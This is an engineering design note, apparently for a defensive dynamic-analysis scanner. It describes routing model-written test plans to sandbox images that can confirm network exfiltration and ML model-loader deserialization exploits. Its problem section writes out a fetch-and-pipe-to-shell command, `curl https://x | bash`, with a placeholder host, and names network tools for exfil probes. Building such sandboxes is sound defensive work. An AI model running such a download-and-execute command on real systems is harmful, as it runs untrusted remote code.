# DAST-005 Multi-Image Sandbox — Design

**Status:** Design + plumbing in this commit. Production image build/deploy
deferred to a follow-up infra commit (Tal owns Fly deploy operations).
**Goal:** Per-hypothesis sandbox image routing so DAST plans can confirm
behaviors that the current single image cannot (network exfil, ML
loader exploits).

## Problem

The prototype runs a single Firecracker image (`argus-dast-sandbox:latest`)
which is intentionally minimal — Python + glibc + a few utilities. Two
classes of finding cannot be confirmed inside this image:

1. **Network behavior** — `curl`, `wget`, `nc`, `dig`, fully-resolving
   DNS chain. The image has Python `urllib`/`requests` working through
   the DNS-hijack sink, but plans that try `curl https://x | bash` fail
   with "curl: command not found" and the orchestrator downgrades the
   verdict (the litellm_obfuscated iter-2 erosion observed in the
   campaign).

2. **ML model loaders** — `transformers`, `torch`, `tensorflow`. Plans
   that need to exercise an attacker-controlled model loader to verify
   exploitable deserialization (`load_distributed_checkpoint`,
   `megatron_gpt2_loader`, `perceiver_model_loader`) hit ImportError
   inside the minimal image. The plan correctly identifies the
   exploit path but cannot demonstrate it, so DAST stays at L1's
   `suspicious` verdict.

## Solution

Add a per-plan `image_hint` field. The plan decides which image its
hypothesis needs; the orchestrator routes to the matching sandbox client.

### Image taxonomy

| Hint | Contents | Use cases |
|---|---|---|
| `minimal` | Python 3.12, stdlib, base shell utilities, DNS hijack sink | Default. File-write persistence, exec markers, pure-Python exploits, code_pattern_observed events. |
| `networked` | `minimal` + `curl`, `wget`, `netcat`, `dnsutils`, `openssl` (CLI) | Exfil confirmation, payload-fetcher chains, raw TCP probes, DNS exfil patterns. |
| `ml_tools` | `networked` + `transformers`, `torch` (CPU), `tensorflow` (CPU), `safetensors`, `huggingface_hub` | ML model deserialization exploits, pickle-via-checkpoint loaders, custom-loader RCE. |

`networked` is a strict superset of `minimal`; `ml_tools` is a strict
superset of `networked`. We could collapse to just `ml_tools` for
everything but pay the cold-start time penalty (~3-5x larger image).

### Plan layer changes

Schema (`dast_prompts.phase_a_plan_schema`):

```diff
 "required": [
   "hypothesis_id", "plan_status", "commands", "oracle",
-  "expected_evidence", "payload", "timeout_sec", "rationale",
+  "expected_evidence", "payload", "timeout_sec", "rationale", "image_hint",
 ],
 "properties": {
   ...
+  "image_hint": {
+    "type": "string",
+    "enum": ["minimal", "networked", "ml_tools"],
+  },
 }
```

Plan prompt rule: short paragraph in the `_PLANNING_RULES` section
explaining the taxonomy and "default to `minimal`; pick the smallest
image that contains every binary your `commands` list invokes."

### Sandbox layer changes

`SandboxPlan` model:

```python
class SandboxPlan(BaseModel):
    ...
    image_hint: str = "minimal"  # New field; default preserves prior behavior
```

`MultiImageSandboxClient` — new composition:

```python
@dataclass
class MultiImageSandboxClient:
    """Routes plans to per-image inner clients by plan.image_hint."""
    inner_by_hint: dict[str, SandboxClient]  # "minimal", "networked", "ml_tools"
    fallback_hint: str = "minimal"

    async def submit(self, plan: SandboxPlan) -> SandboxTrace:
        client = self.inner_by_hint.get(plan.image_hint) \
            or self.inner_by_hint[self.fallback_hint]
        return await client.submit(plan)
```

The Protocol stays unchanged — `MultiImageSandboxClient` IS a
`SandboxClient`. Existing single-image callers don't need to know it
exists.

### Orchestrator wiring

In `dast_orchestrator.run_dast`, when constructing `SandboxPlan` from a
plan dict, pull `image_hint` from the plan and forward:

```python
plan = SandboxPlan(
    plan_id=...,
    file_id=...,
    ...
    image_hint=p.get("image_hint", "minimal"),
)
```

That's the entire orchestrator change. The actual dispatch lives inside
`MultiImageSandboxClient`; the orchestrator just hands off.

## Why this design (vs. alternatives)

**Why per-plan and not per-file?** A single file may want different
images per hypothesis. `litellm_obfuscated` could have one hypothesis
testing the local exec path (`minimal`) and a sibling testing the
network exfil chain (`networked`). Per-file routing forces a single
choice; per-plan doesn't.

**Why an enum, not a free-form image string?** Free-form invites
prompt-injection / hallucinated image names. An enum constrains the
model to choices the orchestrator can validate cheaply.

**Why a `MultiImageSandboxClient` wrapper instead of a `images: dict`
field on `FirecrackerSandboxClient`?** Stays Protocol-clean. Any
sandbox implementation (stub, gVisor in the future, local-Docker) can
be wrapped without modification. Tests can compose mocks per image.

## Scope of this commit (code + tests, not deploy)

In scope:

- `image_hint` field on `SandboxPlan` (default `minimal`)
- Plan schema enum + planner-prompt rule
- `MultiImageSandboxClient` composition with dispatch + fallback
- Orchestrator pass-through of `image_hint`
- Unit tests: dispatch, fallback, default, and three-image routing

Out of scope (separate infra commit, Tal-owned):

- Building the `networked` and `ml_tools` Docker images
- Deploying them to the Fly registry
- Wiring `MultiImageSandboxClient` into the production scanner with
  the three resolved image refs
- e2e validation against the four target files (litellm,
  audit_log_compression, event_stream, sandbox_runner)

The plumbing is invisible to single-image callers, so this commit
ships safely without the new images existing yet — the orchestrator
defaults every plan to `minimal` until prompts encourage other choices.

## Risks

- **Cold-start time on `ml_tools`:** `transformers` + `torch` is heavy.
  Mitigate by warming a small pool of pre-booted machines per image.
  Defer to infra commit.
- **Plan over-asks `ml_tools`:** prompt-rule must emphasize "smallest
  sufficient image" so unnecessary `ml_tools` use doesn't blow latency.
- **L1 hypotheses don't carry image hints today:** Phase B (orchestrator-
  generated upstream-causation hypotheses) won't have an image hint
  baked in, so the planner picks at plan-time per hypothesis. Same
  mechanism for both phases.
